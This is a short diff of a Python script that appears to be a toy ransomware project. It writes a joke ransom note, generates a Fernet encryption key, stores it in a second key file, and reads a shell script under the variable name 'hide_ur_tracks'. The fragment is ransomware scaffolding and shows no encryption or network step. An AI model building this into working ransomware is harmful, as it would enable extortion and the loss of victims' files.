@@ -23,7 +23,11 @@ note = "Give me many bonanas."
 
 with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
+
 hideur = Fernet.generate_key()
+with open("store2.key", "wb") as second_key:
+    second_key.write(hideur)
+
 
 with open("run_this.sh", "rb") as hide_ur_tracks:
     contents = hide_ur_tracks.read()
